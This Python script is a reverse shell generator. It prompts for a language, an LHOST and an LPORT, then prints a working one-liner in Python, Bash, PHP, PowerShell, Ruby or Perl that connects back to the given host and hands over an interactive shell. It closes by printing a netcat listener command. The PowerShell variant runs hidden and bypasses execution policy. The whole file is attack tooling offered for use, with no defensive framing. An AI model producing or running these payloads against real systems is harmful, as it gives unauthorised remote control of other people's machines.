""" ANSI color codes """
BLACK = "\033[0;30m"
RED = "\033[0;31m"
GREEN = "\033[0;32m"
BROWN = "\033[0;33m"
BLUE = "\033[0;34m"
PURPLE = "\033[0;35m"
CYAN = "\033[0;36m"
LIGHT_GRAY = "\033[0;37m"
DARK_GRAY = "\033[1;30m"
LIGHT_RED = "\033[1;31m"
LIGHT_GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
LIGHT_BLUE = "\033[1;34m"
LIGHT_PURPLE = "\033[1;35m"
LIGHT_CYAN = "\033[1;36m"
LIGHT_WHITE = "\033[1;37m"
BOLD = "\033[1m"
FAINT = "\033[2m"
ITALIC = "\033[3m"
UNDERLINE = "\033[4m"
BLINK = "\033[5m"
NEGATIVE = "\033[7m"
CROSSED = "\033[9m"
END = "\033[0m"
        # op
print("[1] = python ")
print("[2] = python3 ")
print("[3] = bash ")
print("[4] = php ")
print("[5] = powershell ")
print("[6] = ruby ")
print("[7] = perl \n\n")




# ask
ask_3 = input("\n\nprint the options number : ")

#erors chek
if ask_3 != "1" and ask_3 != "2" and ask_3 != "3" and ask_3 != "4" and ask_3 != "5" and ask_3 != "6" and ask_3 != "7" :
    print(LIGHT_RED+"command note find "+END)
lhost_3 = input("LHOST : ")
lport_3 = input("LPORT : ")
print("\n")

        # python
if ask_3 == "1" :
    print("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" """+lhost_3+""" ","""+lport_3+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'""")

        # python3
if ask_3 == "2" :
    print("""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" """+lhost_3+""" ","""+lport_3+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'""")

        # bash
if ask_3 == "3" :
    print("""/bin/bash -i >& /dev/tcp/"""+lhost_3+"""/"""+lport_3+""" 0>&1""")

        # php
if ask_3 == "4" :
    print("""php -r '$sock=fsockopen(" """+lhost_3+""" ","""+lport_3+""");exec("/bin/bash <&3 >&3 2>&3");'""")

        # powershell
if ask_3 == "5" :
    print(""" powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(' """+lhost_3+""" ', """+lport_3+""");$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()" """)

        # ruby
if ask_3 == "6" :
    print(""" ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new(" """+lhost_3+""" ","""+lport_3+"""))' """)

        # perl
if ask_3 == "7" :
    print(""" perl -e 'use Socket;$i=" """+lhost_3+""" ";$p="""+lport_3+""";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};' """)
3
        # to listen
print("to listen : nc -lnvp "+lport_3)